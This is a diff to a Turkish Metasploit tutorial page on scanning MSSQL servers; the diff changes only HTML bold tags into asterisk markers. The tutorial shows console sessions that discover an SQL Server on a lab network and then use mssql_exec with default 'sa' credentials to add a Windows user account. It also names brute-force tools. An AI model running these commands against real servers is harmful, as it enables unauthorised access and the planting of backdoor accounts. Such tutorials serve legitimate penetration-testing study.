@@ -38,10 +38,10 @@ url: /tr/msf-icinde-mssql-tarama/
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> search mssql
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  search mssql
 
 Matching Modules
-<strong>================</strong>
+***================*** 
 
    Name                                                      Disclosure Date  Rank       Description
    ----                                                      ---------------  ----       -----------
@@ -60,7 +60,7 @@ Matching Modules
    auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
    auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
    auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
-   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker <strong>(</strong>Fast Mode<strong>)</strong>
+   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker ***(*** Fast Mode***)*** 
    auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
    auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
    auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
@@ -86,62 +86,62 @@ Matching Modules
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use auxiliary/scanner/mssql/mssql_ping
-msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use auxiliary/scanner/mssql/mssql_ping
+msf auxiliary***(*** mssql_ping***)***  ***&gt;***  show options
 
-Module options <strong>(</strong>auxiliary/scanner/mssql/mssql_ping<strong>)</strong>:
+Module options ***(*** auxiliary/scanner/mssql/mssql_ping***)*** :
 
    Name                 Current Setting  Required  Description
    ----                 ---------------  --------  -----------
-   PASSWORD                              no        The password <strong>for </strong>the specified username
+   PASSWORD                              no        The password ***for *** the specified username
    RHOSTS                                yes       The target address range or CIDR identifier
-   TDSENCRYPTION        false            yes       Use TLS/SSL <strong>for </strong>TDS data "Force Encryption"
+   TDSENCRYPTION        false            yes       Use TLS/SSL ***for *** TDS data "Force Encryption"
    THREADS              1                yes       The number of concurrent threads
    USERNAME             sa               no        The username to authenticate as
-   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification <strong>(</strong>requires DOMAIN option set<strong>)</strong>
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification ***(*** requires DOMAIN option set***)*** 
 
-msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> set RHOSTS 10.211.55.1/24
-RHOSTS <strong>=&gt;</strong> 10.211.55.1/24
-msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> exploit
+msf auxiliary***(*** mssql_ping***)***  ***&gt;***  set RHOSTS 10.211.55.1/24
+RHOSTS ***=&gt;***  10.211.55.1/24
+msf auxiliary***(*** mssql_ping***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong> SQL Server information <strong>for </strong>10.211.55.128:
-<strong>[</strong><strong>*</strong><strong>]</strong> tcp <strong>=</strong> 1433
-<strong>[</strong><strong>*</strong><strong>]</strong> np <strong>=</strong> SSHACKTHISBOX-0pipesqlquery
-<strong>[</strong><strong>*</strong><strong>]</strong> Version <strong>=</strong> 8.00.194
-<strong>[</strong><strong>*</strong><strong>]</strong> InstanceName <strong>=</strong> MSSQLSERVER
-<strong>[</strong><strong>*</strong><strong>]</strong> IsClustered <strong>=</strong> No
-<strong>[</strong><strong>*</strong><strong>]</strong> ServerName <strong>=</strong> SSHACKTHISBOX-0
-<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
+***[*** ******* ***]***  SQL Server information ***for *** 10.211.55.128:
+***[*** ******* ***]***  tcp ***=***  1433
+***[*** ******* ***]***  np ***=***  SSHACKTHISBOX-0pipesqlquery
+***[*** ******* ***]***  Version ***=***  8.00.194
+***[*** ******* ***]***  InstanceName ***=***  MSSQLSERVER
+***[*** ******* ***]***  IsClustered ***=***  No
+***[*** ******* ***]***  ServerName ***=***  SSHACKTHISBOX-0
+***[*** ******* ***]***  Auxiliary module execution completed
 </code></pre>
 <!-- /wp:code -->
 
-  Sonuçta görüldüğü gibi&nbsp;<code>10.211.55.128</code>&nbsp;IP adresinde ve 1433 numaralı Portta MSSQL servisi çalışmaktadır. Bu noktadan sonra&nbsp;<code>mssql_exec</code>&nbsp;modülü kullanılarak&nbsp;<strong>brute-force</strong>&nbsp;denemeleri yapılabilir. Alternatif olarak medusa veya THC-Hydra kullanılabilir. 
+  Sonuçta görüldüğü gibi&nbsp;<code>10.211.55.128</code>&nbsp;IP adresinde ve 1433 numaralı Portta MSSQL servisi çalışmaktadır. Bu noktadan sonra&nbsp;<code>mssql_exec</code>&nbsp;modülü kullanılarak&nbsp;***brute-force*** &nbsp;denemeleri yapılabilir. Alternatif olarak medusa veya THC-Hydra kullanılabilir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary<strong>(</strong>mssql_login<strong>)</strong> <strong>&gt;</strong> use auxiliary/admin/mssql/mssql_exec
-msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary***(*** mssql_login***)***  ***&gt;***  use auxiliary/admin/mssql/mssql_exec
+msf auxiliary***(*** mssql_exec***)***  ***&gt;***  show options
 
-Module options <strong>(</strong>auxiliary/admin/mssql/mssql_exec<strong>)</strong>:
+Module options ***(*** auxiliary/admin/mssql/mssql_exec***)*** :
 
    Name                 Current Setting                       Required  Description
    ----                 ---------------                       --------  -----------
-   CMD                  cmd.exe /c echo OWNED <strong>&gt;</strong> C:\owned.exe  no        Command to execute
-   PASSWORD                                                   no        The password <strong>for </strong>the specified username
+   CMD                  cmd.exe /c echo OWNED ***&gt;***  C:\owned.exe  no        Command to execute
+   PASSWORD                                                   no        The password ***for *** the specified username
    RHOST                                                      yes       The target address
-   RPORT                1433                                  yes       The target port <strong>(</strong>TCP<strong>)</strong>
-   TDSENCRYPTION        false                                 yes       Use TLS/SSL <strong>for </strong>TDS data "Force Encryption"
+   RPORT                1433                                  yes       The target port ***(*** TCP***)*** 
+   TDSENCRYPTION        false                                 yes       Use TLS/SSL ***for *** TDS data "Force Encryption"
    USERNAME             sa                                    no        The username to authenticate as
-   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification <strong>(</strong>requires DOMAIN option set<strong>)</strong>
+   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification ***(*** requires DOMAIN option set***)*** 
 
 
-msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set RHOST 10.211.55.128
-RHOST <strong>=&gt;</strong> 10.211.55.128
-msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set MSSQL_PASS password
-MSSQL_PASS <strong>=&gt;</strong> password
-msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set CMD net user atom password /ADD
-cmd <strong>=&gt;</strong> net user atom password /ADD
-msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> exploit
+msf auxiliary***(*** mssql_exec***)***  ***&gt;***  set RHOST 10.211.55.128
+RHOST ***=&gt;***  10.211.55.128
+msf auxiliary***(*** mssql_exec***)***  ***&gt;***  set MSSQL_PASS password
+MSSQL_PASS ***=&gt;***  password
+msf auxiliary***(*** mssql_exec***)***  ***&gt;***  set CMD net user atom password /ADD
+cmd ***=&gt;***  net user atom password /ADD
+msf auxiliary***(*** mssql_exec***)***  ***&gt;***  exploit
 </code></pre>
 <!-- /wp:code -->
 
